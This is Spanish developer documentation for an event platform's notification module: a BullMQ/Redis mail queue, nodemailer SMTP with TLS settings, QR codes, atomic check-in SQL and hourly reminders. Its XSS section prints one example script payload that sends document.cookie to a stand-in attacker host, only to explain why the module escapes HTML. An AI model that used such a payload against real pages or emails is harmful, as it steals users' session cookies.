# Documentación del módulo de notificaciones, QR y check-in

Este documento explica el funcionamiento completo del módulo: cómo se envían los correos, cómo se genera el código QR, cómo funciona el check-in, y todas las decisiones técnicas que se tomaron. Está pensado para ser leído de principio a fin.

---

## Índice

1. [Visión general](#1-visión-general)
2. [Tecnologías utilizadas](#2-tecnologías-utilizadas)
3. [Arquitectura del módulo](#3-arquitectura-del-módulo)
4. [La cola de mensajes con BullMQ y Redis](#4-la-cola-de-mensajes-con-bullmq-y-redis)
5. [El Worker: quién procesa los correos](#5-el-worker-quién-procesa-los-correos)
6. [El servicio SMTP y la generación de QR](#6-el-servicio-smtp-y-la-generación-de-qr)
7. [Las plantillas HTML](#7-las-plantillas-html)
8. [escapeHtml: protección contra XSS](#8-escapehtml-protección-contra-xss)
9. [Los cuatro tipos de correo](#9-los-cuatro-tipos-de-correo)
10. [El scheduler de recordatorios](#10-el-scheduler-de-recordatorios)
11. [El check-in atómico](#11-el-check-in-atómico)
12. [El reporte de asistencia](#12-el-reporte-de-asistencia)
13. [Conexión Redis compartida](#13-conexión-redis-compartida)
14. [Graceful shutdown](#14-graceful-shutdown)
15. [Configuración SMTP y TLS](#15-configuración-smtp-y-tls)
16. [Variables de entorno](#16-variables-de-entorno)
17. [Flujo completo de una inscripción](#17-flujo-completo-de-una-inscripción)
18. [Correcciones aplicadas y por qué](#18-correcciones-aplicadas-y-por-qué)

---

## 1. Visión general

El módulo de notificaciones se encarga de enviar correos electrónicos automáticos a los usuarios en cuatro situaciones:

| Evento | Correo enviado |
|---|---|
| Un usuario se inscribe a un evento | Confirmación de inscripción con código QR |
| El organizador cambia la fecha, hora o lugar | Notificación de actualización a todos los inscritos activos |
| Un inscrito presenta su QR en el evento | Confirmación de asistencia registrada |
| Un evento es el día siguiente | Recordatorio automático a los inscritos |

**Principio fundamental:** los correos nunca se envían directamente desde el hilo HTTP que atiende la petición del usuario. El envío de un correo puede tardar entre 1 y 5 segundos (conexión SMTP, generación del QR, etc.). Si se hiciera directo, el cliente tendría que esperar todo ese tiempo para recibir la respuesta de la API. En cambio, se usa una **cola de mensajes**: la petición HTTP encola el trabajo en menos de 1ms y responde inmediatamente; un proceso separado (el Worker) lo ejecuta en segundo plano.

---

## 2. Tecnologías utilizadas

| Librería | Rol |
|---|---|
| **BullMQ** | Sistema de colas de jobs basado en Redis. Gestiona la ejecución, reintentos y persistencia de los trabajos de correo. |
| **ioredis** | Cliente de Redis para Node.js. BullMQ lo usa internamente para almacenar los jobs. |
| **nodemailer** | Librería que se conecta a un servidor SMTP y envía correos en formato HTML. |
| **qrcode** | Genera el código QR como imagen en formato base64, lista para incrustar en el HTML del correo. |

Todas estas dependencias están declaradas en `package.json` y se instalan con `npm install`.

---

## 3. Arquitectura del módulo

```
src/
├── core/
│   └── config/
│       ├── redis.config.ts         Variables REDIS_HOST y REDIS_PORT (lazy)
│       ├── redisConnection.ts      Singleton de conexión Redis compartida
│       └── mailer.config.ts        Variables SMTP (lazy)
│
└── notification/
    ├── queues/
    │   └── Mailer.queue.ts         Define la cola "mailer" en Redis
    ├── workers/
    │   └── Mailer.worker.ts        Consume jobs de la cola y llama al servicio
    ├── schedulers/
    │   └── Reminder.scheduler.ts   Busca eventos próximos y encola recordatorios
    ├── services/
    │   └── Mailer.service.ts       Genera QR, renderiza HTML y envía el correo
    └── templates/
        ├── utils/
        │   └── escapeHtml.ts       Sanitiza texto antes de insertarlo en HTML
        ├── confirmation.template.ts
        ├── event-update.template.ts
        ├── checkin.template.ts
        └── reminder.template.ts
```

Los módulos que **disparan** los correos son externos a `notification/`:

- `src/enrollment/services/Enrollment.service.ts` — encola `enrollment-confirmation` al crear una inscripción.
- `src/enrollment/services/CheckIn.service.ts` — encola `checkin-confirmation` al registrar asistencia.
- `src/event/services/Event.service.ts` — encola `event-update` cuando se modifica fecha, hora o lugar.
- `src/notification/schedulers/Reminder.scheduler.ts` — encola `event-reminder` automáticamente cada hora.

---

## 4. La cola de mensajes con BullMQ y Redis

**Archivo:** `src/notification/queues/Mailer.queue.ts`

### ¿Qué es una cola?

Una cola es como una lista de tareas pendientes almacenada en Redis. Alguien "encola" una tarea (el productor) y otro proceso la "consume" cuando tiene capacidad (el worker/consumidor). Si el servidor de correo está caído, el job queda esperando en Redis y se reintentará más tarde.

### El objeto `mailerQueue`

```typescript
export const mailerQueue = {
    add: (...args: Parameters<Queue['add']>) => getMailerQueue().add(...args)
}
```

Este objeto es el que usan todos los servicios para encolar un correo. Internamente crea la cola en Redis la primera vez que se llama (patrón lazy: no crea nada hasta que realmente se necesita). Esto es importante porque en ESM los `import` se evalúan antes de que `dotenv.config()` cargue las variables de entorno — si se creara al importar el módulo, `REDIS_HOST` todavía sería una cadena vacía.

### Configuración de reintentos

```typescript
defaultJobOptions: {
    attempts: 3,           // máximo 3 intentos por job
    backoff: {
        type: 'exponential',
        delay: 5000,       // 5s, 25s, 125s entre intentos
    },
    removeOnComplete: 100, // conserva los últimos 100 jobs completados en Redis
    removeOnFail: 200,     // conserva los últimos 200 jobs fallidos en Redis
}
```

Con backoff exponencial, si el servidor SMTP está temporalmente caído, el sistema espera progresivamente más tiempo entre intentos en lugar de saturarlo con peticiones.

---

## 5. El Worker: quién procesa los correos

**Archivo:** `src/notification/workers/Mailer.worker.ts`

El Worker es un proceso que escucha la cola "mailer" en Redis y ejecuta cada job cuando llega su turno. Se ejecuta en el mismo proceso del servidor Node, pero de forma concurrente (hasta 5 correos al mismo tiempo).

```typescript
async function processJob(job: Job): Promise<void> {
    switch (job.name) {
        case 'enrollment-confirmation':
            await mailerService.sendEnrollmentConfirmation(job.data)
            break
        case 'event-update':
            await mailerService.sendEventUpdate(job.data)
            break
        case 'checkin-confirmation':
            await mailerService.sendCheckInConfirmation(job.data)
            break
        case 'event-reminder':
            await mailerService.sendReminder(job.data)
            break
    }
}
```

El `job.name` identifica el tipo de correo; `job.data` contiene los datos necesarios (email del destinatario, nombre del evento, fecha, etc.).

Los eventos del worker se loguean con prefijos consistentes:
- `[Mailer] ✔ Job completado` — el correo fue enviado correctamente.
- `[Mailer] ✘ Job fallido` — ocurrió un error (BullMQ reintentará).

El worker se inicia en `src/index.ts` después de que la base de datos esté lista:

```typescript
const mailerWorker = startMailerWorker()
```

---

## 6. El servicio SMTP y la generación de QR

**Archivo:** `src/notification/services/Mailer.service.ts`

Este servicio tiene dos responsabilidades:

### Generación del código QR

```typescript
const qrImageBase64 = await QRCode.toDataURL(data.enrollmentId)
```

`QRCode.toDataURL()` toma el `id` (UUID) de la inscripción y devuelve una cadena en formato `data:image/png;base64,iVBOR...`. Esta cadena se puede usar directamente como atributo `src` de una etiqueta `<img>` en el HTML del correo. El QR contiene únicamente el UUID de la inscripción — al escanearlo, el organizador obtiene ese ID y lo manda al endpoint de check-in.

### El transporter SMTP (lazy)

```typescript
private get transporter(): nodemailer.Transporter {
    if (!this._transporter) {
        const port = SMTP_PORT()
        this._transporter = nodemailer.createTransport({
            host: SMTP_HOST(),
            port,
            secure: port === 465,
            auth: { user: SMTP_USER(), pass: SMTP_PASS() },
            tls: { rejectUnauthorized: !SMTP_TLS_INSECURE() },
        })
    }
    return this._transporter
}
```

El transporter (la "conexión" al servidor SMTP) también se crea de forma lazy por la misma razón que la cola: las variables de entorno aún no están disponibles al momento de importar el módulo.

- `secure: port === 465` — activa TLS implícito solo si el puerto es 465 (el estándar para SMTP con TLS directo). Para el puerto 587 (STARTTLS) se deja en `false`.
- `rejectUnauthorized: !SMTP_TLS_INSECURE()` — por defecto `true`, lo que significa que Node verifica que el certificado SSL del servidor SMTP sea válido. Solo se desactiva si se define `SMTP_TLS_INSECURE=true` en el `.env`, útil para servidores de correo locales de desarrollo sin certificado válido.

---

## 7. Las plantillas HTML

**Archivos:** `src/notification/templates/*.template.ts`

Cada tipo de correo tiene su propia plantilla: una función que recibe los datos del correo y devuelve un string con el HTML completo, listo para enviar.

```typescript
export function confirmationTemplate(data: ConfirmationTemplateData): string {
    const userName = escapeHtml(data.userName)
    const eventName = escapeHtml(data.eventName)
    // ...
    return `<!DOCTYPE html>...<h1>¡Inscripción Confirmada!</h1>...`
}
```

Las plantillas son HTML estático con template literals de JavaScript (`${variable}`). No usan ningún motor de plantillas externo como Handlebars o EJS, lo que hace el código más simple y sin dependencias adicionales.

---

## 8. escapeHtml: protección contra XSS

**Archivo:** `src/notification/templates/utils/escapeHtml.ts`

### ¿Qué es XSS?

XSS (Cross-Site Scripting) es un tipo de ataque donde un usuario malicioso inyecta código HTML o JavaScript en datos que luego son renderizados sin sanitizar. En el contexto de correos, si alguien crea un evento con el nombre:

```
<script>document.location='http://atacante.com/robar?cookie='+document.cookie</script>
```

y ese nombre se inserta directamente en el HTML del correo, el cliente de correo que renderice el mensaje ejecutará ese script, pudiendo robar datos del usuario.

### La solución

```typescript
const HTML_ESCAPE_MAP: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
}

export function escapeHtml(value: string): string {
    return value.replace(/[&<>"']/g, char => HTML_ESCAPE_MAP[char])
}
```

La función recorre el string carácter a carácter y reemplaza los cinco caracteres especiales del HTML por sus entidades equivalentes:

| Carácter | Se convierte en | Por qué es peligroso sin escapar |
|---|---|---|
| `<` | `&lt;` | Abre etiquetas HTML (`<script>`, `<img>`) |
| `>` | `&gt;` | Cierra etiquetas HTML |
| `&` | `&amp;` | Inicia entidades HTML |
| `"` | `&quot;` | Rompe atributos HTML (`onclick="..."`) |
| `'` | `&#39;` | Rompe atributos con comilla simple |

Así, el nombre del evento `<script>alert(1)</script>` se convierte en `&lt;script&gt;alert(1)&lt;/script&gt;`, que el navegador muestra como texto literal inofensivo en lugar de ejecutarlo.

### Qué se escapa y qué no

En las plantillas se escapan todos los campos que vienen de datos de usuario: `userName`, `eventName`, `eventDate`, `eventLocation`, `checkedInAt`.

El campo `qrImageBase64` **no se escapa** porque es el output de la librería `qrcode`, que siempre devuelve una cadena base64 válida sin caracteres HTML peligrosos.

---

## 9. Los cuatro tipos de correo

### `enrollment-confirmation` — Confirmación de inscripción

**Quién lo encola:** `Enrollment.service.ts`, método `create()`, después de guardar la inscripción en la base de datos.

**Payload:**
```typescript
{
    enrollmentId: string  // UUID de la inscripción (contenido del QR)
    userEmail: string
    userName: string
    eventName: string
    eventDate: string     // formateado en zona horaria America/Bogota
    eventLocation: string
}
```

**Qué hace el Worker:** llama a `mailerService.sendEnrollmentConfirmation()`, que genera el QR a partir del `enrollmentId`, renderiza la plantilla con el QR incrustado y envía el correo.

---

### `event-update` — Actualización de evento

**Quién lo encola:** `Event.service.ts`, método `update()`, solo si el update incluyó cambios en `startAt`, `endAt` o `location`.

**A quiénes se notifica:** todos los inscritos con estado `PENDING` o `CONFIRMED`. Se excluyen los `CANCELLED` (ya no van) y los `CHECKED_IN` (ya asistieron y no necesitan saber el cambio).

---

### `checkin-confirmation` — Confirmación de asistencia

**Quién lo encola:** `CheckIn.service.ts`, después de registrar el check-in en la base de datos.

**Qué contiene:** nombre del evento y la hora exacta en que se registró la asistencia.

---

### `event-reminder` — Recordatorio

**Quién lo encola:** el Scheduler de recordatorios, automáticamente, sin intervención humana.

**A quiénes se envía:** inscritos con estado `PENDING` o `CONFIRMED` cuyo evento empieza entre 23 y 25 horas desde ahora, y que aún no tienen `reminderSentAt` marcado.

---

## 10. El scheduler de recordatorios

**Archivo:** `src/notification/schedulers/Reminder.scheduler.ts`

El scheduler es un proceso que se ejecuta automáticamente cada hora para detectar eventos próximos y enviar recordatorios.

### Cómo funciona internamente

BullMQ permite crear "job schedulers" que insertan un job repetitivo en una cola. El scheduler crea su propia cola `reminder-scheduler` y su propio worker:

```typescript
schedulerQueue.upsertJobScheduler(
    'check-upcoming-events',
    { every: 60 * 60 * 1000 },   // cada hora
    { name: 'check-upcoming-events' },
)
```

Cada hora, el worker de esa cola ejecuta `processReminderCheck()`.

### La consulta SQL

```sql
SELECT e.id, ev.name, ev."startAt", ev.location, u.email, u.username
FROM "Events" ev
INNER JOIN "Enrollments" e ON e."eventId" = ev.id
INNER JOIN "Users" u ON u.id = e."userId"
WHERE ev."startAt" BETWEEN NOW() + INTERVAL '23 hours' AND NOW() + INTERVAL '25 hours'
  AND ev."eventStatus" != 'CANCELLED'
  AND e."enrollmentStatus" NOT IN ('CANCELLED', 'CHECKED_IN')
  AND e."reminderSentAt" IS NULL
```

La ventana `23h–25h` se solapa exactamente con el intervalo de 1 hora del scheduler, garantizando que cada inscripción sea detectada una sola vez.

### Idempotencia: el campo `reminderSentAt`

El campo `reminderSentAt` en la tabla `Enrollments` es la clave para garantizar que cada usuario recibe el recordatorio exactamente una vez.

**El problema sin este campo:**
- El scheduler corre a las 10:00 y detecta un evento mañana a las 11:00.
- Encola el recordatorio para el usuario A.
- El scheduler corre a las 11:00 y **vuelve a detectar el mismo evento** (ahora a 24 horas exactas de distancia).
- Vuelve a encolar el recordatorio → el usuario recibe 2 correos.

**La solución:**
```typescript
// Después de encolar el recordatorio:
await markReminderSent(enrollment.enrollmentId)
// Ejecuta: UPDATE "Enrollments" SET "reminderSentAt" = NOW() WHERE id = $1
```

La próxima hora, el filtro `e."reminderSentAt" IS NULL` excluye a ese inscrito. El campo es permanente en la base de datos, así que funciona incluso si el proceso se reinicia o Redis se limpia.

---

## 11. El check-in atómico

**Archivo:** `src/enrollment/repositories/Enrollment.repository.ts`, método `checkInAtomic()`

### El problema de la race condition

Imagina que dos personas del personal de un evento escanean el mismo QR al mismo tiempo (dos teléfonos distintos, dos peticiones simultáneas). Con el flujo original:

```
Petición A: lee inscripción → checkedInAt es null ✓
Petición B: lee inscripción → checkedInAt es null ✓
Petición A: actualiza → checkedInAt = ahora
Petición B: actualiza → checkedInAt = ahora (registro duplicado)
```

Ambas peticiones habrían pasado la validación porque ambas leyeron el registro antes de que cualquiera de las dos actualizara.

### La solución: atomicidad en la base de datos

```sql
UPDATE "Enrollments"
SET "enrollmentStatus" = 'CHECKED_IN',
    "checkedInAt"      = $3,
    "updatedAt"        = $3,
    "updatedBy"        = $4
WHERE id              = $1
  AND "eventId"       = $2
  AND "checkedInAt"   IS NULL
  AND "enrollmentStatus" != 'CANCELLED'
  AND "isDeleted"     = false
RETURNING *
```

Este `UPDATE` es una operación atómica en PostgreSQL. La base de datos garantiza que aunque mil peticiones lleguen al mismo tiempo, solo una de ellas encontrará `checkedInAt IS NULL` y ejecutará la actualización. Las demás afectarán 0 filas.

### Manejo del resultado

```typescript
const updated = await this.enrollmentRepository.checkInAtomic(enrollmentId, eventId, 'system')

if (!updated) {
    // Solo si el UPDATE afectó 0 filas, se hace una consulta de diagnóstico
    const enrollment = await this.enrollmentRepository.findById(enrollmentId)
    if (!enrollment)             throw new NotFoundError('...')
    if (enrollment.event?.id !== eventId)   throw new ForbiddenError('...')
    if (enrollment.enrollmentStatus === 'CANCELLED') throw new ForbiddenError('...')
    if (enrollment.checkedInAt)  throw new AlreadyExistError('...')
}
```

Si `updated` es `null` (0 filas afectadas), se hace una segunda consulta solo para saber el motivo del fallo y devolver el código HTTP correcto (404, 403 o 409). Esta segunda consulta es de diagnóstico, no de escritura, así que no hay riesgo.

---

## 12. El reporte de asistencia

**Archivo:** `src/enrollment/repositories/Enrollment.repository.ts`, método `findAttendanceReport()`

**Endpoint:** `GET /api/v1/enrollments/event/:id/report`

```sql
SELECT
    COUNT(*)                                                    AS total,
    COUNT(*) FILTER (WHERE "enrollmentStatus" = 'CHECKED_IN') AS "checkedIn",
    COUNT(*) FILTER (WHERE "enrollmentStatus" = 'CONFIRMED')  AS confirmed,
    COUNT(*) FILTER (WHERE "enrollmentStatus" = 'PENDING')    AS pending,
    COUNT(*) FILTER (WHERE "enrollmentStatus" = 'CANCELLED')  AS cancelled
FROM "Enrollments"
WHERE "eventId" = $1 AND "isDeleted" = false
```

El `FILTER (WHERE ...)` es una característica de PostgreSQL que permite hacer conteos condicionales en una sola pasada por la tabla, sin necesidad de hacer cuatro queries separadas.

**Respuesta de ejemplo:**
```json
{
    "event": { "id": "...", "name": "Workshop de DevOps" },
    "total": 50,
    "checkedIn": 32,
    "confirmed": 10,
    "pending": 5,
    "cancelled": 3,
    "enrollments": [ ... ]
}
```

---

## 13. Conexión Redis compartida

**Archivo:** `src/core/config/redisConnection.ts`

```typescript
let _connection: Redis | null = null

export function getRedisConnection(): Redis {
    if (!_connection) {
        _connection = new Redis({
            host: REDIS_HOST(),
            port: REDIS_PORT(),
            maxRetriesPerRequest: null,
        })
    }
    return _connection
}
```

Este es el patrón **Singleton**: se crea una única instancia de la conexión Redis y todos los módulos que la necesitan la comparten. Sin esto, cada módulo (Mailer.queue, Mailer.worker, Reminder.scheduler) abría su propia conexión TCP a Redis — tres conexiones para el mismo proceso haciendo la misma tarea. Con el singleton, hay una sola conexión reutilizada por todos.

`maxRetriesPerRequest: null` es un requisito de BullMQ para el modo de bloqueo que usa internamente.

---

## 14. Graceful shutdown

**Archivo:** `src/index.ts`

```typescript
async function gracefulShutdown(signal: string): Promise<void> {
    console.log(`[Server] ${signal} received — shutting down gracefully`)
    server.close()
    await Promise.all([
        mailerWorker.close(),
        reminderWorker.close(),
        reminderQueue.close(),
        closeMailerQueue(),
        closeRedisConnection(),
    ])
    process.exit(0)
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'))
process.on('SIGINT', () => gracefulShutdown('SIGINT'))
```

Cuando el proceso recibe una señal de terminación (`SIGTERM` en deploys y contenedores Docker, `SIGINT` con Ctrl+C), en lugar de morir abruptamente:

1. Cierra el servidor HTTP (deja de aceptar nuevas peticiones).
2. Espera a que el Worker termine el job que esté procesando en ese momento.
3. Cierra la cola y la conexión Redis limpiamente.
4. Sale del proceso.

Sin esto, un job a medio procesar quedaría en estado `active` en Redis indefinidamente, bloqueando esa "ranura" hasta que BullMQ detecte el timeout de stall.

---

## 15. Configuración SMTP y TLS

**Archivo:** `src/core/config/mailer.config.ts`

```typescript
export const SMTP_HOST       = () => process.env.SMTP_HOST       || ''
export const SMTP_PORT       = () => Number(process.env.SMTP_PORT) || 587
export const SMTP_USER       = () => process.env.SMTP_USER       || ''
export const SMTP_PASS       = () => process.env.SMTP_PASS       || ''
export const SMTP_FROM       = () => process.env.SMTP_FROM       || 'no-reply@bitfive.dev'
export const SMTP_TLS_INSECURE = () => process.env.SMTP_TLS_INSECURE === 'true'
```

Todas las variables son **funciones** (getters lazy), no constantes. Si fueran constantes, se evaluarían al momento del `import`, antes de que `dotenv.config()` cargue el `.env`. Al ser funciones, leen `process.env` cuando son llamadas, momento en que el `.env` ya está cargado.

### Por qué `smtp-relay.sendinblue.com` y no `smtp-relay.brevo.com`

Brevo (antes Sendinblue) cambió su nombre de marca, pero el certificado TLS de su servidor SMTP aún está emitido para los dominios legacy `*.sendinblue.com`. Si se usa `smtp-relay.brevo.com` como host con `rejectUnauthorized: true`, Node detecta que el hostname no coincide con el certificado y rechaza la conexión. La solución es usar `smtp-relay.sendinblue.com`, que sí está en el certificado y apunta a la misma infraestructura.

---

## 16. Variables de entorno

Todas las variables sensibles van en el archivo `.env` (nunca commiteado). El archivo `.env.example` sirve como plantilla para nuevas instalaciones.

| Variable | Descripción | Ejemplo |
|---|---|---|
| `REDIS_HOST` | Host de Redis | `localhost` |
| `REDIS_PORT` | Puerto de Redis | `6379` |
| `SMTP_HOST` | Host del servidor SMTP | `smtp-relay.sendinblue.com` |
| `SMTP_PORT` | Puerto SMTP (587=STARTTLS, 465=TLS) | `587` |
| `SMTP_USER` | Usuario de autenticación SMTP | (login de Brevo) |
| `SMTP_PASS` | Contraseña SMTP | (API key de Brevo) |
| `SMTP_FROM` | Dirección del remitente verificado | `no-reply@tudominio.com` |
| `SMTP_TLS_INSECURE` | Deshabilita verificación TLS (solo dev) | `true` o no definir |

---

## 17. Flujo completo de una inscripción

A continuación se describe paso a paso qué ocurre cuando un usuario hace `POST /api/v1/enrollments`:

```
1. El cliente HTTP envía la petición con { eventId, enrollmentStatus }

2. CheckIn.controller valida que enrollmentId y eventId sean UUIDs válidos
   (Validator.isUUID evita errores 500 del driver de PostgreSQL)

3. Enrollment.service.create() guarda la inscripción en la base de datos

4. Se hace una segunda consulta para obtener la inscripción completa
   (con los datos del usuario y del evento cargados)

5. Se encola el job 'enrollment-confirmation' en Redis via mailerQueue.add()
   → La petición HTTP responde al cliente con 201 Created (< 50ms total)

6. En segundo plano, el Mailer Worker detecta el nuevo job en Redis

7. Worker llama a mailerService.sendEnrollmentConfirmation(job.data)

8. mailerService genera el QR:
   QRCode.toDataURL(enrollmentId) → "data:image/png;base64,iVBOR..."

9. Se renderiza confirmationTemplate() con los datos del evento y el QR.
   escapeHtml() protege userName, eventName y eventLocation.

10. nodemailer envía el correo via SMTP a la dirección del usuario

11. El Worker loguea: [Mailer] ✔ Job completado: enrollment-confirmation
```

Si el paso 10 falla (SMTP caído), BullMQ reintentará automáticamente hasta 3 veces con backoff exponencial (5s, 25s, 125s).

---

## 18. Correcciones aplicadas y por qué

Esta sección documenta los problemas que existían y cómo se resolvieron.

### Dependencias no declaradas en `package.json`
`bullmq`, `ioredis`, `nodemailer` y `qrcode` no estaban en `package.json`. El proyecto funcionaba localmente porque `node_modules` los tenía instalados, pero `npm ci` en cualquier otro entorno fallaría. Se declararon con sus versiones exactas.

### Race condition en check-in
El flujo `leer → validar → actualizar` permitía que dos peticiones simultáneas con el mismo QR pasaran ambas la validación. Se reemplazó por un `UPDATE ... WHERE checkedInAt IS NULL RETURNING *` atómico. Solo una petición puede afectar la fila; la otra recibe 0 filas y obtiene un error 409.

### Enums incorrectos en el reporte
`findAttendanceReport` contaba `enrollmentStatus = 'ACTIVE'`, un valor que no existe en el dominio. El conteo de "pendientes" siempre era 0. Se corrigió para usar `PENDING` y `CONFIRMED`, los valores reales.

### Ruta inconsistente
El controlador usaba `@Controller('/checkIn')` (camelCase) pero la documentación decía `/checkin`. Express es case-sensitive. Se normalizó a `/checkin`.

### XSS en plantillas
Los datos de usuario se interpolaban directamente en HTML sin escapar. Se creó `escapeHtml.ts` y se aplicó a todos los campos de usuario en las cuatro plantillas.

### Recordatorios duplicados
El scheduler enviaba hasta 24 recordatorios por evento porque la ventana de 24h se detectaba en cada ciclo horario. Se añadió `reminderSentAt` a la tabla `Enrollments` como marcador permanente, y se acotó la ventana a `23h–25h`.

### TLS laxo en SMTP
`rejectUnauthorized: false` desactivaba la verificación del certificado SSL del servidor SMTP, abriendo la puerta a ataques MITM. Se activó la verificación por defecto y se añadió `SMTP_TLS_INSECURE` como escape hatch explícito para desarrollo.

### Sin graceful shutdown
Al detener el proceso, los jobs en ejecución quedaban en estado `active` en Redis. Se añadieron handlers para `SIGTERM` y `SIGINT` que cierran el worker ordenadamente antes de salir.

### Validación de UUID
Los endpoints que recibían IDs no validaban el formato. Un string inválido causaba un error 500 del driver de PostgreSQL en lugar de un 400 descriptivo. Se aplicó `Validator.isUUID()` en todos los endpoints que reciben IDs.

### Notificaciones a `CHECKED_IN` en actualizaciones de evento
Cuando el organizador modificaba el evento, se notificaba también a quienes ya habían asistido. Se los excluyó del filtro: solo reciben la notificación los inscritos con estado `PENDING` o `CONFIRMED`.

### Conexiones Redis duplicadas
Cada módulo (queue, worker, scheduler) abría su propia conexión TCP a Redis. Se centralizó en un singleton en `redisConnection.ts`, reduciendo de 3 conexiones a 1.

### Certificado TLS de Brevo
`smtp-relay.brevo.com` no está en el certificado del servidor SMTP de Brevo (que aún usa `*.sendinblue.com`). Al activar `rejectUnauthorized: true`, las conexiones empezaron a fallar con "Hostname/IP does not match certificate's altnames". Se cambió el host a `smtp-relay.sendinblue.com`, que sí está en el certificado y apunta a la misma infraestructura.
